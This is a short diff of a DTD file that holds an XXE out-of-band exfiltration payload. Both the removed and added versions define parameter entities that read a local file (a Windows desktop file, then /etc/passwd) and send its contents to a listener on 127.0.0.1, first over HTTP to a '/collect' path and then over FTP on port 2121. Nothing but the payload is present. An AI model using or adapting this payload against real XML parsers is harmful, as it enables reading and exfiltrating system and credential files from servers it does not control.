@@ -1,2 +1,2 @@
-<!ENTITY % b SYSTEM "C:\Users\Gleb\Desktop\pssw">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://127.0.0.1:8888/collect?input=%b;'>"> %c; %rrr;
+<!ENTITY % b SYSTEM "file:///etc/passwd">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://127.0.0.1:2121/%b;'>">
